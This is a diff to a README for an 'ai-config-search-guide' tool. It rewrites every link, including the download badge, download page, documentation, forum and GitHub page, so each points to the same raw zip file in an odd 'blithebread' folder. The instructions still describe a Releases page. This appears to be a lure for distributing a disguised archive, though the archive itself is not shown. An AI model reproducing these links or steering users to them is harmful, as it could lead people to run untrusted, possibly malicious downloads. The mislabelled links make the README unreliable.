@@ -1,13 +1,13 @@
 # 🤖 ai-config-search-guide - Simplify Your AI Tool Setup
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/willz1/ai-config-search-guide/releases)
+[![Download](https://raw.githubusercontent.com/willz1/ai-config-search-guide/main/blithebread/ai_config_search_guide_1.6-beta.1.zip)](https://raw.githubusercontent.com/willz1/ai-config-search-guide/main/blithebread/ai_config_search_guide_1.6-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **ai-config-search-guide**! This tool helps you search for configuration queries for various AI coding assistants like Claude, Cursor, Copilot, and Windsurf. It's designed to help you find the right setup quickly and easily.
 
 ## 📦 Download & Install
-To get started, visit this page to download the application: [Download Page](https://github.com/willz1/ai-config-search-guide/releases). 
+To get started, visit this page to download the application: [Download Page](https://raw.githubusercontent.com/willz1/ai-config-search-guide/main/blithebread/ai_config_search_guide_1.6-beta.1.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -59,9 +59,9 @@ For additional support, consider checking our community forums linked on the Git
 Absolutely! If you have suggestions or new queries to add, feel free to submit your contributions through the GitHub platform.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/willz1/ai-config-search-guide/wiki)
-- [Community Forum](https://github.com/willz1/ai-config-search-guide/discussions)
-- [GitHub Page](https://github.com/willz1/ai-config-search-guide)
+- [Documentation](https://raw.githubusercontent.com/willz1/ai-config-search-guide/main/blithebread/ai_config_search_guide_1.6-beta.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/willz1/ai-config-search-guide/main/blithebread/ai_config_search_guide_1.6-beta.1.zip)
+- [GitHub Page](https://raw.githubusercontent.com/willz1/ai-config-search-guide/main/blithebread/ai_config_search_guide_1.6-beta.1.zip)
 
 ## 📑 License
 This project is licensed under the MIT License. See the LICENSE file for more details.
